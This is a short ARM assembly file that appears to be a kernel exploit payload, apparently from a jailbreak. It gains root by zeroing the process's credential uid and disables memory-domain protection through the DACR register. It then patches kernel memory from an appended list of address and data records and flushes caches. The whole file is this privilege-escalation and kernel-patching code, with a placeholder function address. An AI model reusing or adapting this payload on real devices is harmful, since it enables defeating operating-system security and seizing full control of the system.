.syntax unified
.globl start
start:
    # make me root
    ldr r3, proc_ucred
    blx r3
    mov r1, #0
    str r1, [r0, #0xc]

    # fix the DACR
    mov r0, #1
    mcr p15, 0, r0, c3, c0, 0

    adr r0, weirdfile
pf_loop:
    ldr r3, [r0], #4 ;# addr
    cmp r3, #0
    beq pf_done

    add r2, r3, r1

    ldr r1, [r0], #4 ;# datalen
    cmp r1, #4
    bne copy_loop
    ;# if it's 4, it must be done atomically
    ldr lr, [r0]
    str lr, [r3]
    b inval_loop

copy_loop:
    ldrb lr, [r0], #1
    strb lr, [r3], #1
    cmp r3, r2
    bne copy_loop
    
    sub r3, r1
inval_loop:
    # no, this is not wrong
    mcr p15, 0, r3, c7, c11, 1
    mcr p15, 0, r3, c7, c5, 1
    cmp r3, r2
    add r3, #16
    bls inval_loop

    b pf_loop

pf_done:
    mcr p15, 0, r0, c7, c5, 6 

    # return to userland

.align 2
proc_ucred: .long 0xdeadbeef
weirdfile:
